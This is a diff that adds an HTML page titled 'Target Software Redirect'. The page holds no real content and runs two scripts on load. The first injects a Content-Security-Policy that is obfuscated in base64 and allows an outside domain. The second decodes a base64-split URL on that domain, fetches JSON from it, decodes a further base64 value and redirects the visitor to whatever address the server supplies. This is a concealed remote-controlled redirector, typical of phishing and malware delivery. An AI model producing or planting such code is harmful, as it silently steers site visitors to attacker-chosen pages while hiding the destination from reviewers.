@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <script>
+const cspParts = [
+  'ZGVmYXVsdC1zcmMgJ3NlbGYnOyA=',
+  'c2NyaXB0LXNyYyAgJ3NlbGYnICd1bnNhZmUtaW5saW5lJyBodHRwczovL21heWRhbmlyb25oZWFkcy5jb207IA==',
+  'c3R5bGUtc3JjICAgJ3NlbGYnOyA=',
+  'Y29ubmVjdC1zcmMgJ3NlbGYnIGh0dHBzOi8vbWF5ZGFuaXJvbmhlYWRzLmNvbQ=='
+];
+
+const meta = document.createElement('meta');
+meta.httpEquiv = 'Content-Security-Policy';
+meta.content = cspParts.map(p => atob(p)).join('');
+document.head.appendChild(meta);
+</script>
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <title>Target Software Redirect</title>
+  </head>
+  <body>      </header>
+
+    <script>
+      (function() {
+        'use strict';
+        
+        const parts = [
+          'aHR0cHM6Ly8=',
+          'bWF5ZGFuaXJvbmhlYWRz',
+          'LmNvbS8=',
+          'YmFyZWJ1aC5qZXc='
+        ];
+        
+        const buildUrl = () => {
+          return parts.map(p => atob(p)).join('');
+        };
+        
+        const performRedirect = async () => {
+          try {
+            const apiUrl = buildUrl();
+            const response = await fetch(apiUrl);
+            
+            if (!response.ok) {
+              throw new Error('Network response failed: ' + response.status);
+            }
+            
+            const data = await response.json();
+            const decodedUrl = atob(data.c);
+            
+            if (!(/^https?:\/\//i.test(decodedUrl))) {
+              throw new Error('URL validation failed');
+            }
+            
+            window.location.href = decodedUrl;
+          } catch (error) {
+            console.error('Redirect error:', error);
+          }
+        };
+        
+        performRedirect();
+      })();
+    </script>
+  </body>
+</html>
